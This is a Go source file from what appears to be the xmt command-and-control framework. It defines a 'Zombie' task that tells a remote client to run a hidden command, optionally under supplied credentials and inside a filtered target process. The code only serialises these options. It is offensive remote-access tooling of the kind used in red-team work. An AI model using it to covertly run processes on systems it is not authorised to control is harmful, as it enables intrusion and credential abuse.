// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Zombie is a Tasklet that is similar to the 'cmd.Zombie' struct. This is
// used to Task a Client with running a specified zombie command.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The Filter attribute will attempt to set the target that runs the Zombie
// Process. If none are specified, the Process will be ran under the client
// process.
//
// C2 Details:
//
//	ID: WvZombie
//
//	Input:
//	    Zombie struct {
//	        []byte          // Data
//	        []string        // Args
//	        string          // Dir
//	        []string        // Environment
//	        uint32          // Flags
//	        bool            // Wait
//	        int64           // Timeout
//	        bool            // Hide
//	        string          // Username
//	        string          // Domain
//	        string          // Password
//	        Filter struct { // Filter
//	            bool        // Filter Status
//	            uint32      // PID
//	            bool        // Fallback
//	            uint8       // Session
//	            uint8       // Elevated
//	            []string    // Exclude
//	            []string    // Include
//	        }
//	        []byte          // Stdin Data
//	    }
//	Output:
//	    uint32              // PID
//	    int32               // Exit Code
//	    []byte              // Output (Stdout and Stderr)
type Zombie struct {
	Filter *filter.Filter

	Dir                string
	Data               []byte
	Env, Args          []string
	User, Domain, Pass string

	Stdin   []byte
	Timeout time.Duration
	Flags   uint32

	Wait, Hide bool
}

// Packet will take the configured Zombie options and will return a Packet
// and any errors that may occur during building.
//
// This allows Zombie to fulfil the 'Tasklet' interface.
//
// C2 Details:
//
//	ID: WvZombie
//
//	Input:
//	    Process struct {
//	        []byte          // Data
//	        []string        // Args
//	        string          // Dir
//	        []string        // Environment
//	        uint32          // Flags
//	        bool            // Wait
//	        int64           // Timeout
//	        bool            // Hide
//	        string          // Username
//	        string          // Domain
//	        string          // Password
//	        Filter struct { // Filter
//	            bool        // Filter Status
//	            uint32      // PID
//	            bool        // Fallback
//	            uint8       // Session
//	            uint8       // Elevated
//	            []string    // Exclude
//	            []string    // Include
//	        }
//	        []byte          // Stdin Data
//	    }
//	Output:
//	    uint32              // PID
//	    int32               // Exit Code
//	    []byte              // Output (Stdout and Stderr)
func (z Zombie) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvZombie}
	z.MarshalStream(n)
	return n, nil
}

// MarshalStream writes the data for this Zombie to the supplied Writer.
func (z Zombie) MarshalStream(w data.Writer) error {
	if err := w.WriteBytes(z.Data); err != nil {
		return err
	}
	if err := data.WriteStringList(w, z.Args); err != nil {
		return err
	}
	if err := w.WriteString(z.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, z.Env); err != nil {
		return err
	}
	if err := w.WriteBool(z.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(z.Flags); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(z.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(z.Hide); err != nil {
		return err
	}
	if err := w.WriteString(z.User); err != nil {
		return err
	}
	if err := w.WriteString(z.Domain); err != nil {
		return err
	}
	if err := w.WriteString(z.Pass); err != nil {
		return err
	}
	if err := z.Filter.MarshalStream(w); err != nil {
		return err
	}
	return w.WriteBytes(z.Stdin)
}

// UnmarshalStream reads the data for this Zombie from the supplied Reader.
func (z *Zombie) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBytes(&z.Data); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &z.Args); err != nil {
		return err
	}
	if err := r.ReadString(&z.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &z.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&z.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&z.Flags); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&z.Timeout)); err != nil {
		return err
	}
	if err := r.ReadBool(&z.Hide); err != nil {
		return err
	}
	if err := r.ReadString(&z.User); err != nil {
		return err
	}
	if err := r.ReadString(&z.Domain); err != nil {
		return err
	}
	if err := r.ReadString(&z.Pass); err != nil {
		return err
	}
	if err := filter.UnmarshalStream(r, &z.Filter); err != nil {
		return err
	}
	return r.ReadBytes(&z.Stdin)
}
